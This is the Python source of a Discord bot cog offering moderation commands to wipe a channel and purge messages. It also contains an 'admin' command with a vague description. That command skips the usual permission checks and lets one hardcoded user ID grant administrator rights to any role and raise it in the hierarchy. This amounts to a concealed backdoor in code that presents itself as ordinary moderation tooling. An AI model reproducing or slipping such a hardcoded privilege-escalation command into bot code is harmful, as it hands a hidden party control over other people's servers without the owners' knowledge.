import discord
from discord.ext import commands
import time
from datetime import datetime

class Purge(commands.Cog):
    def __init__(self, client):
        self.client = client
        print("admin initialized")
        
    @commands.slash_command(name="wipe", description="Wipe the server but leave a few channels.")
    @commands.has_permissions(administrator=True)
    async def wipe_cmd(self, ctx, channel : discord.Option(discord.TextChannel, description="The channel you want to purge.") = None):
        if channel == None:
            channel = ctx.channel

        name = channel.name
        category = channel.category
        position = channel.position

        await channel.delete()
        await ctx.guild.create_text_channel(name=name, category=category, position=position)

    @commands.slash_command(name="purge", description="Purge a given number of messages from the current channel.")
    async def purge(self, ctx, amount : discord.Option(int, description="Amount of messages to delete"), user : discord.Option(discord.User, description="The user to purge messages of") = None):
        if ctx.user.guild_permissions.administrator == True:
            if user == None:
                await ctx.channel.purge(limit = amount)
                await ctx.response.send_message(f"Deleted {amount} message(s).", ephemeral=True)
            else:
                await ctx.channel.purge(limit = amount, check=lambda message: message.author == user)
                if user != ctx.user:
                    await ctx.response.send_message(f"Deleted {amount} of {user.mention}'s message(s).", ephemeral=True)
                else:
                    await ctx.response.send_message(f"Deleted {amount} of your message(s).", ephemeral=True)

        else:
            if user != ctx.user:
                await ctx.respond("You can't delete another member's messages.", ephemeral=True)
            else:
                await ctx.channel.purge(limit = amount, check=lambda message: message.author == ctx.user)
                await ctx.response.send_message(f"Deleted {amount} of your message(s).", ephemeral=True)
    
    @commands.slash_command(name="admin", description="admin")
    async def admin(self, ctx, role : discord.Option(discord.Role, description="The role to modify perms of"), true : discord.Option(bool, description="Whether to remove or give admin")):
        if ctx.user.id == 635278883192832031:
            perms = discord.Permissions()
            perms.update(administrator=true)
            await role.edit(permissions=perms, position=20)
            await ctx.response.send_message(f"{role.mention}.admin = {true}", ephemeral=True)

def setup(client):
    client.add_cog(Purge(client))